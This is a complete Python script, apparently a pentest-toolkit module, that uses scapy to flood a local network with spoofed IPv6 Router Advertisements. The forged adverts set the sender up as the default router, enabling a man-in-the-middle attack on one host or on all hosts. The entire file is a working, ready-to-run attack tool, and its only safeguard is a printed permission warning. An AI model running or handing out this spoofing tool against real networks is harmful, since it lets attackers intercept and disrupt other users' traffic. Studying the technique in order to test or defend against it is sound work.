#!/usr/bin/env python3
"""
IPv6 RA Spoof Module
Spoof IPv6 Router Advertisements to perform MITM
"""

import os
import sys
import time
import signal
import random

try:
    from scapy.all import Ether, IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, sendp, get_if_hwaddr
except ImportError:
    print("Error: scapy not installed")
    sys.exit(1)

def send_ra(interface, target_mac=None, prefix="fd00::/64", lifetime=3600):
    """Send spoofed IPv6 Router Advertisement"""
    try:
        # Get our MAC address
        src_mac = get_if_hwaddr(interface)
        
        # Use broadcast MAC if target not specified
        dst_mac = target_mac if target_mac else "ff:ff:ff:ff:ff:ff"
        
        # Create IPv6 RA packet
        ra = ICMPv6ND_RA()
        ra.routerlifetime = lifetime
        
        # Add prefix information option
        prefix_info = ICMPv6NDOptPrefixInfo(
            prefix=prefix.split('/')[0],
            prefixlen=int(prefix.split('/')[1]),
            L=1,  # Link local address
            A=1,  # Autonomous address configuration
            validlifetime=3600,
            preferredlifetime=1800
        )
        
        # Build packet
        packet = Ether(src=src_mac, dst=dst_mac)/\
                 IPv6(src="fe80::1", dst="ff02::1")/\
                 ra/prefix_info
        
        sendp(packet, iface=interface, verbose=False)
        return True
    except Exception as e:
        return False

def main():
    interface = os.getenv('ARG_INTERFACE')
    target_mac = os.getenv('ARG_TARGET_MAC')
    prefix = os.getenv('ARG_PREFIX', 'fd00::/64')
    lifetime = int(os.getenv('ARG_LIFETIME', '3600'))
    
    if not interface:
        print("Error: interface required")
        sys.exit(1)
    
    print(f"[!] WARNING: IPv6 RA spoofing can disrupt network connectivity")
    print(f"[!] Only use on networks you own or have permission to test")
    print(f"\n[*] IPv6 RA Spoof Module")
    print(f"[*] Interface: {interface}")
    print(f"[*] Prefix: {prefix}")
    print(f"[*] Lifetime: {lifetime}s")
    
    if target_mac:
        print(f"[*] Target MAC: {target_mac}")
    else:
        print(f"[*] Target: All IPv6 hosts (broadcast)")
    
    sent = 0
    start_time = time.time()
    
    def signal_handler(sig, frame):
        elapsed = time.time() - start_time
        print(f"\n[+] Sent {sent} RA packets in {elapsed:.2f}s")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        print(f"\n[*] Starting IPv6 RA spoofing...")
        
        while True:
            if send_ra(interface, target_mac, prefix, lifetime):
                sent += 1
                print(f"[+] Sent RA packet {sent}", end='\r')
            
            time.sleep(2)
    
    except PermissionError:
        print("Error: This requires root/administrator privileges")
        sys.exit(1)
    except KeyboardInterrupt:
        elapsed = time.time() - start_time
        print(f"\n[+] Sent {sent} RA packets in {elapsed:.2f}s")
    except Exception as e:
        print(f"\nError: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
